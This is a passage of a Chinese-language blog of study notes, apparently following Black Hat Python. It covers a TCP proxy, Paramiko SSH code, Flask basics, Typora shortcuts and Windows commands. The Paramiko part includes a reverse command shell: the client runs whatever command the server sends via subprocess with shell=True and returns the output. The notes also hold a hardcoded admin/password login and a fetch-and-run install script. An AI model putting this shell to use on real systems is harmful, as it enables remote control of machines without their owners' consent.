bytes to localhost."</span> %len(remote_buffer))</span><br><span class="line">            client_socket.send(remote_buffer)</span><br><span class="line">        <span class="comment">#现在我们从本地循环读取数据，发送给远程主机和本地主机</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment">#从本地读取数据</span></span><br><span class="line">            local_buffer=receive_from(client_socket)</span><br><span class="line">            <span class="keyword">if</span> len(local_buffer):</span><br><span class="line">                print(<span class="string">"==&gt; Received %d bytes from localhost."</span> %len(local_buffer))</span><br><span class="line">                hexdump(local_buffer)</span><br><span class="line">                <span class="comment">#发送给我们的本地请求</span></span><br><span class="line">                local_buffer=request_handler(local_buffer)</span><br><span class="line">                <span class="comment">#向远程主机发送数据</span></span><br><span class="line">                remote_socket.send(local_buffer)</span><br><span class="line">                print(<span class="string">"==&gt; sent to remote."</span>)</span><br><span class="line">            <span class="comment">#接收响应的数据</span></span><br><span class="line">            remote_buffer=receive_from(remote_socket)</span><br><span class="line">            <span class="keyword">if</span> len(remote_buffer):</span><br><span class="line">                print(<span class="string">"&lt;== receive %d bytes from remote."</span> % len(remote_buffer))</span><br><span class="line">                hexdump(remote_buffer)</span><br><span class="line">                <span class="comment">#发送到响应处理函数</span></span><br><span class="line">                remote_buffer=response_handler(remote_buffer)</span><br><span class="line">                <span class="comment">#将响应发送给本地socket</span></span><br><span class="line">                client_socket.send(remote_buffer)</span><br><span class="line">                print(<span class="string">"&lt;=== sent to localhost."</span>)</span><br><span class="line">            <span class="comment">#如果两边都没有数据，关闭连接</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(local_buffer) <span class="keyword">or</span> <span class="keyword">not</span> len(remote_buffer):</span><br><span class="line">                client_socket.close()</span><br><span class="line">                remote_socket.close()</span><br><span class="line">                print(<span class="string">"No more data. Closing connections."</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexdump</span><span class="params">(src, length = <span class="number">16</span>)</span>:</span></span><br><span class="line">    src=src.decode()</span><br><span class="line">    result = []</span><br><span class="line">    digits = <span class="number">2</span> <span class="keyword">if</span> isinstance(src, str) <span class="keyword">else</span> <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(src), length):</span><br><span class="line">        s = src[i:i+length]</span><br><span class="line">        hexa = <span class="string">' '</span>.join([<span class="string">'%0*X'</span> % (digits, ord(x)) <span class="keyword">for</span> x <span class="keyword">in</span> s])</span><br><span class="line">        text = <span class="string">''</span>.join([x <span class="keyword">if</span> <span class="number">0x20</span> &lt;= ord(x) &lt; <span class="number">0x7F</span> <span class="keyword">else</span> <span class="string">'.'</span> <span class="keyword">for</span> x <span class="keyword">in</span> s])</span><br><span class="line">        result.append(<span class="string">'%04X  %-*s   %s'</span> % (i, length*(digits + <span class="number">1</span>), hexa, text))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">        print(i)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_from</span><span class="params">(connection)</span>:</span></span><br><span class="line">    str=<span class="string">b''</span></span><br><span class="line">    connection.settimeout(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=connection.recv(<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            str+=data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_handler</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">response_handler</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv[<span class="number">1</span>:])!=<span class="number">5</span>:</span><br><span class="line">        print(<span class="string">"Usage: ./proxy 127.0.0.1 9000 10.12.132.1 9000 True 参数要对"</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#设置本地监听参数</span></span><br><span class="line">    local_host=sys.argv[<span class="number">1</span>]</span><br><span class="line">    local_port=int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="comment">#设置远程目标</span></span><br><span class="line">    remote_host=sys.argv[<span class="number">3</span>]</span><br><span class="line">    remote_port=int(sys.argv[<span class="number">4</span>])</span><br><span class="line">    <span class="comment">#告诉代理在发送给远程主机</span></span><br><span class="line">    receive_first=sys.argv[<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"True"</span> <span class="keyword">in</span> receive_first:</span><br><span class="line">        receive_first=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        receive_first=<span class="literal">False</span></span><br><span class="line">    <span class="comment">#设置好监听socket</span></span><br><span class="line">    server_loop(local_host,local_port,remote_host,remote_port,receive_first)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h3 id="6-通过Paramiko使用SSH"><a href="#6-通过Paramiko使用SSH" class="headerlink" title="6.通过Paramiko使用SSH"></a><strong>6.通过Paramiko使用SSH</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -m PEM -f &#x2F;etc&#x2F;ssh&#x2F;test_rsa_key</span><br><span class="line">ssh-keygen -t rsa -f &#x2F;etc&#x2F;ssh&#x2F;test_rsa_key</span><br></pre></td></tr></table></figure>





<p>创建SSH客户端</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 Paramiko示例文件的密钥</span></span><br><span class="line"><span class="comment">#host_key = paramiko.RSAKey(filename='test_rsa.key')</span></span><br><span class="line">host_key = paramiko.RSAKey(filename=<span class="string">'/etc/ssh/test2_rsa_key'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span><span class="params">(paramiko.ServerInterface)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.event = threading.Event()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_channel_request</span><span class="params">(self, kind, chanid)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="string">'session'</span>:</span><br><span class="line">            <span class="keyword">return</span> paramiko.OPEN_SUCCEEDED</span><br><span class="line">        <span class="keyword">return</span> paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_auth_password</span><span class="params">(self, username, password)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (username == <span class="string">'orld'</span>) <span class="keyword">and</span> (password == <span class="string">'orld'</span>):</span><br><span class="line">            <span class="keyword">return</span> paramiko.AUTH_SUCCESSFUL</span><br><span class="line">        <span class="keyword">return</span> paramiko.AUTH_FAILED</span><br><span class="line"></span><br><span class="line">server = sys.argv[<span class="number">1</span>]</span><br><span class="line">ssh_port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    <span class="comment">#TCP socket</span></span><br><span class="line">    <span class="comment">#这里value设置为1，表示将SO_REUSEADDR标记为TRUE，操作系统会在服务器socket被关闭或服务器进程终止后马上释放该服务器的端口，否则操作系统会保留几分钟该端口。</span></span><br><span class="line">    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sock.bind((server, ssh_port))   <span class="comment">#绑定ip和端口</span></span><br><span class="line">    sock.listen(<span class="number">100</span>)    <span class="comment">#最大连接数为100</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'[+] Listening for connection ...'</span>)                                                                                                                                                      </span><br><span class="line">    client, addr = sock.accept()                                                                                                                                                                    </span><br><span class="line"><span class="keyword">except</span> :</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'[-] Listen failed: '</span> )</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'[+] Got a connection!'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    bhSession = paramiko.Transport(client)</span><br><span class="line">    bhSession.add_server_key(host_key)</span><br><span class="line">    server = Server()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bhSession.start_server(server=server)</span><br><span class="line">    <span class="keyword">except</span> paramiko.SSHException:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'[-] SSH negotiation failed'</span>)</span><br><span class="line">    chan = bhSession.accept(<span class="number">20</span>) <span class="comment">#设置超时值为20</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'[+] Authenticated!'</span>)</span><br><span class="line">    <span class="keyword">print</span> (chan.recv(<span class="number">1024</span>).decode())</span><br><span class="line">    chan.send(<span class="string">'Welcome to bh_ssh'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command = input(<span class="string">"Enter command:"</span>).strip(<span class="string">"\n"</span>)   <span class="comment">#strip移除字符串头尾指定的字符（默认为空格）,这里是换行</span></span><br><span class="line">            <span class="keyword">if</span> command != <span class="string">'exit'</span>:</span><br><span class="line">                chan.send(command)</span><br><span class="line">                print(command)</span><br><span class="line">                print(<span class="string">"okkkk"</span>)</span><br><span class="line">                <span class="keyword">print</span> (chan.recv(<span class="number">1024</span>).decode())</span><br><span class="line">                print(<span class="string">"1233333"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                chan.send(<span class="string">'exit'</span>)</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">'exiting'</span>)</span><br><span class="line">                bhSession.close()</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">'exit'</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            bhSession.close()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'[-] Caught exception: '</span> )</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bhSession.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>





<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_command</span><span class="params">(ip, user, passwd, command,port)</span>:</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    <span class="comment"># client.load_host_keys('/home/root/.ssh/known_hosts') #支持用密钥认证代替密码验证,实际环境推荐使用密钥认证</span></span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())    <span class="comment">#设置自动添加和保存目标ssh服务器的ssh密钥</span></span><br><span class="line">    client.connect(ip, port=<span class="number">80</span>,username=user, password=passwd)  <span class="comment">#连接</span></span><br><span class="line">    ssh_session = client.get_transport().open_session() <span class="comment">#打开会话</span></span><br><span class="line">    <span class="keyword">if</span> ssh_session.active:</span><br><span class="line">        ssh_session.send(command)   <span class="comment">#发送command这个字符串，并不是执行命令</span></span><br><span class="line">        <span class="keyword">print</span> (ssh_session.recv(<span class="number">1024</span>).decode())   <span class="comment">#返回命令执行结果(1024个字符)</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            c = ssh_session.recv(<span class="number">1024</span>).decode() </span><br><span class="line">            <span class="comment">#print(c)#从ssh服务器获取命令</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                print(c)</span><br><span class="line">                cmd_output = subprocess.check_output(c, shell=<span class="literal">True</span>)</span><br><span class="line">               <span class="comment">#print(cmd_output.decode())</span></span><br><span class="line">                ssh_session.send(cmd_output)</span><br><span class="line">            <span class="keyword">except</span> :</span><br><span class="line">                ssh_session.send(<span class="string">'wrong'</span>)</span><br><span class="line">        client.close()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">ssh_command(<span class="string">'127.0.0.1'</span>, <span class="string">'orld'</span>, <span class="string">'orld'</span>, <span class="string">'ClientConnected'</span>,<span class="string">'80'</span>)</span><br></pre></td></tr></table></figure>



<h3 id="7-SSH隧道"><a href="#7-SSH隧道" class="headerlink" title="7.SSH隧道"></a><strong>7.SSH隧道</strong></h3><h3 id="Web攻击"><a href="#Web攻击" class="headerlink" title="Web攻击"></a>Web攻击</h3><h4 id="1-web开发相关知识"><a href="#1-web开发相关知识" class="headerlink" title="1.web开发相关知识"></a>1.web开发相关知识</h4><p>Web应用的本质就是：</p>
<ol>
<li>浏览器发送一个HTTP请求；</li>
<li>服务器收到请求，生成一个HTML文档；</li>
<li>服务器把HTML文档作为HTTP响应的Body发送给浏览器；</li>
<li>浏览器收到HTTP响应，从HTTP Body取出HTML文档并显示。</li>
</ol>
<p>所以，最简单的Web应用就是先把HTML用文件保存好，用一个现成的HTTP服务器软件，接收用户请求，从文件中读取HTML，返回。Apache、Nginx、Lighttpd等这些常见的静态服务器就是干这件事情的。</p>
<p>如果要动态生成HTML，就需要把上述步骤自己来实现。不过，接受HTTP请求、解析HTTP请求、发送HTTP响应都是苦力活，如果我们自己来写这些底层代码，还没开始写动态HTML呢，就得花个把月去读HTTP规范。</p>
<p>正确的做法是底层代码由专门的服务器软件实现，我们用Python专注于生成HTML文档。因为我们不希望接触到TCP连接、HTTP原始请求和响应格式，所以，需要一个统一的接口，让我们专心用Python编写Web业务。</p>
<p>这个接口就是WSGI：Web Server Gateway Interface。</p>
<p>WSGI接口定义非常简单，它只要求Web开发者实现一个函数，就可以响应HTTP请求。我们来看一个最简单的Web版本的“Hello, web!”：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"></span><br><span class="line"><span class="comment">#environ 一个包含所有HTTP请求信息的dict对象</span></span><br><span class="line"><span class="comment">#star_response 一个发送HTTP响应的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    <span class="comment">#header只能发送一次，即只能调用一次star_response</span></span><br><span class="line">    <span class="comment">#start_response接收2个参数，一个是http响应码，一个是一组list，表示header</span></span><br><span class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>, <span class="string">'text/html'</span>)])</span><br><span class="line">    body = <span class="string">'&lt;h1&gt;Hello, %s!&lt;/h1&gt;'</span> % (environ[<span class="string">'PATH_INFO'</span>][<span class="number">1</span>:] <span class="keyword">or</span> <span class="string">'web'</span>) <span class="comment">#localhost../chj 动态输出</span></span><br><span class="line">    <span class="comment">#body = '&lt;h1&gt;hello, &#123;&#125;&lt;/h1&gt;'.format((environ['PATH_INFO'][1:] or 'wsgi'))</span></span><br><span class="line">    print(body)</span><br><span class="line">    <span class="keyword">return</span> [body.encode(<span class="string">'utf-8'</span>)]</span><br><span class="line"></span><br><span class="line">httpd = make_server(<span class="string">''</span>, <span class="number">8000</span>, application)</span><br><span class="line">print(<span class="string">'Serving HTTP on port 8000...'</span>)</span><br><span class="line">httpd.serve_forever() <span class="comment">#开始监听HTTP请求</span></span><br></pre></td></tr></table></figure>

<p>小结：无论多么复杂的Web应用程序，入口都是一个WSGI处理函数。HTTP请求的所有输入信息都可以通过<code>environ</code>获得，HTTP响应的输出都可以通过<code>start_response()</code>加上函数返回值作为Body。</p>
<p>复杂的Web应用程序，光靠一个WSGI函数来处理还是太底层了，我们需要在WSGI之上再抽象出Web框架，进一步简化Web开发。</p>
<p>除了Flask，常见的Python Web框架还有：</p>
<ul>
<li><a href="https://www.djangoproject.com/" target="_blank" rel="noopener">Django</a>：全能型Web框架；</li>
<li><a href="http://webpy.org/" target="_blank" rel="noopener">web.py</a>：一个小巧的Web框架；</li>
<li><a href="http://bottlepy.org/" target="_blank" rel="noopener">Bottle</a>：和Flask类似的Web框架；</li>
<li><a href="http://www.tornadoweb.org/" target="_blank" rel="noopener">Tornado</a>：Facebook的开源异步Web框架。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Home&lt;/h1&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/signin', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin_form</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''&lt;form action="/signin" method="post"&gt;</span></span><br><span class="line"><span class="string">              &lt;p&gt;&lt;input name="username"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">              &lt;p&gt;&lt;input name="password" type="password"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">              &lt;p&gt;&lt;button type="submit"&gt;Sign In&lt;/button&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">              &lt;/form&gt;'''</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/signin', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 需要从request对象读取表单内容：</span></span><br><span class="line">    <span class="keyword">if</span> request.form[<span class="string">'username'</span>]==<span class="string">'admin'</span> <span class="keyword">and</span> request.form[<span class="string">'password'</span>]==<span class="string">'password'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;h3&gt;Hello, admin!&lt;/h3&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h3&gt;Bad username or password.&lt;/h3&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>













<h4 id="2-urllib2-库"><a href="#2-urllib2-库" class="headerlink" title="2.urllib2 库"></a>2.urllib2 库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import urllib2</span><br><span class="line">body &#x3D; urllib2.urlopen(&quot;http:&#x2F;&#x2F;www.nostarch.com&quot;)</span><br><span class="line">print body.read()</span><br></pre></td></tr></table></figure>





<h3 id="typora软件的windows快捷键"><a href="#typora软件的windows快捷键" class="headerlink" title="typora软件的windows快捷键"></a>typora软件的windows快捷键</h3><h4 id="文件类"><a href="#文件类" class="headerlink" title="文件类"></a>文件类</h4><ul>
<li>新建文件： <code>ctrl</code> + <code>N</code></li>
<li>新建窗口： <code>ctrl</code> + <code>shift</code> + <code>N</code></li>
<li>打开： <code>ctrl</code> + <code>O</code></li>
<li>快速打开： <code>ctrl</code> + <code>P</code></li>
<li>保存： <code>ctrl</code> + <code>S</code></li>
<li>另存为： <code>ctrl</code> + <code>shift</code> + <code>S</code></li>
<li>关闭： <code>ctrl</code> + <code>W</code></li>
</ul>
<h4 id="编辑类"><a href="#编辑类" class="headerlink" title="编辑类"></a>编辑类</h4><ul>
<li>撤销： <code>ctrl</code> + <code>Z</code></li>
<li>重做： <code>ctrl</code> + <code>Y</code></li>
<li>剪切： <code>ctrl</code> + <code>X</code></li>
<li>粘贴： <code>ctrl</code> + <code>V</code></li>
<li>复制为Markdown：<code>ctrl</code> + <code>shift</code> + <code>C</code></li>
<li>粘贴为纯文本： <code>ctrl</code> + <code>shift</code> + <code>C</code></li>
<li>全选： <code>ctrl</code> + <code>A</code></li>
<li>选中当前行： <code>ctrl</code> + <code>L</code></li>
<li>选中当前词： <code>ctrl</code> + <code>D</code></li>
<li>跳转到文首： <code>ctrl</code> + <code>Home</code></li>
<li>跳转到文末：<code>ctrl</code> + <code>End</code></li>
<li>跳转到所选内容：<code>ctrl</code> + <code>J</code></li>
<li>查找：ctrl+ F<ul>
<li>查找下一个：<code>F3</code></li>
<li>查找上一个： <code>shift</code> + <code>F3</code></li>
<li>替换： <code>ctrl</code> + <code>H</code></li>
</ul>
</li>
</ul>
<h4 id="段落类"><a href="#段落类" class="headerlink" title="段落类"></a>段落类</h4><ul>
<li>一级标题： <code>ctrl</code> + <code>1</code></li>
<li>二级标题： <code>ctrl</code> + <code>2</code></li>
<li>六级标题： <code>ctrl</code> + <code>6</code></li>
<li>段落： <code>ctrl</code> + <code>0</code></li>
<li>提升标题级别： <code>ctrl</code> + <code>=</code></li>
<li>降低标题级别： <code>ctrl</code> + <code>-</code></li>
<li>表格： <code>ctrl</code> + <code>T</code></li>
<li>代码块： <code>ctrl</code> + <code>shift</code> + <code>K</code></li>
<li>公式块： <code>ctrl</code> + <code>shift</code> + <code>M</code></li>
<li>引用： <code>ctrl</code> + <code>shift</code> + <code>Q</code></li>
<li>有序列表： <code>ctrl</code> + <code>shift</code> + <code>[</code></li>
<li>无序列表： <code>ctrl</code> + <code>shift</code> + <code>]</code></li>
</ul>
<h4 id="格式类"><a href="#格式类" class="headerlink" title="格式类"></a>格式类</h4><ul>
<li>加粗： <code>ctrl</code> + <code>B</code></li>
<li>斜体： <code>ctrl</code> + <code>I</code></li>
<li>下划线： <code>ctrl</code> + <code>U</code></li>
<li>代码： <code>ctrl</code> + <code>shift</code> +   `</li>
<li>删除线： <code>ctrl</code> + <code>shift</code> <code>5</code></li>
<li>超链接：<code>ctrl</code> + <code>K</code></li>
<li>图像： <code>ctrl</code> + <code>shift</code> + <code>I</code></li>
<li>清楚样式： <code>ctrl</code> + <code>\</code></li>
</ul>
<h4 id="视图类"><a href="#视图类" class="headerlink" title="视图类"></a>视图类</h4><ul>
<li>显示/隐藏 侧边栏： <code>ctrl</code> + <code>shift</code> + <code>L</code></li>
<li>大纲视图： <code>ctrl</code> + <code>shift</code> + <code>1</code></li>
<li>文档列表视图： <code>ctrl</code> + <code>shift</code> + 2</li>
<li>搜索： <code>ctrl</code> + <code>shift</code> + <code>F</code></li>
<li>源代码模式： <code>ctrl</code> + <code>/</code></li>
<li>专注模式： <code>F8</code></li>
<li>打字模式： <code>F9</code></li>
<li>切换全屏： <code>F11</code></li>
<li>放大： <code>ctrl</code> + <code>shift</code> + <code>=</code></li>
<li>缩小： <code>ctrl</code> + <code>shift</code> + <code>-</code></li>
<li>应用内窗口切换： <code>ctrl</code> + <code>tab</code></li>
<li>开发者工具： <code>shift</code> + <code>F12</code></li>
</ul>
<p>Xshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>  chmod +x shadowsocks-all.sh</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>  ./shadowsocks-all.sh <span class="number">2</span>&gt;&amp;<span class="number">1</span> | tee shadowsocks-all.log</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> 选择ShowdowsocksR</span><br></pre></td></tr></table></figure>

<h4 id="windows常用cmd命令"><a href="#windows常用cmd命令" class="headerlink" title="windows常用cmd命令"></a><strong>windows常用cmd命令</strong></h4><p>taskkill /f /t /im  后面再更上应用程序的名字 –关闭程序</p>
<table>
<thead>
<tr>
<th>DEL</th>
<th>删除至少一个文件。</th>
</tr>
</thead>
<tbody><tr>
<td>DIR</td>
<td>显示一个目录中的文件和子目录。</td>
</tr>
<tr>
<td>MD</td>
<td>创建一个目录。</td>
</tr>
<tr>
<td>MKDIR</td>
<td>创建一个目录。</td>
</tr>
<tr>
<td>RD</td>
<td>删除目录。</td>
</tr>
<tr>
<td>TREE</td>
<td>以图形方式显示驱动程序或路径的目录结构。</td>
</tr>
<tr>
<td>type</td>
<td>显示文件内容</td>
</tr>
<tr>
<td>CLS</td>
<td>清除屏幕。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>ipconfig</th>
<th>查看网络配置</th>
</tr>
</thead>
<tbody><tr>
<td>netstat</td>
<td>查看网络状态</td>
</tr>
<tr>
<td>ping</td>
<td>检查与目标主机的连通性</td>
</tr>
<tr>
<td>tracert</td>
<td>查看与目标主机的路由节点</td>
</tr>
<tr>
<td>route print</td>
<td>打印与目标主机的路由</td>
</tr>
<tr>
<td>arp</td>
<td>查看本机的ARP缓存表</td>
</tr>
<tr>
<td>nslookup</td>
<td>查看DNS域名解析记录</td>
</tr>
<tr>
<td>net</td>
<td>网络管理</td>
</tr>
</tbody></table>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li></ul>


    </footer>
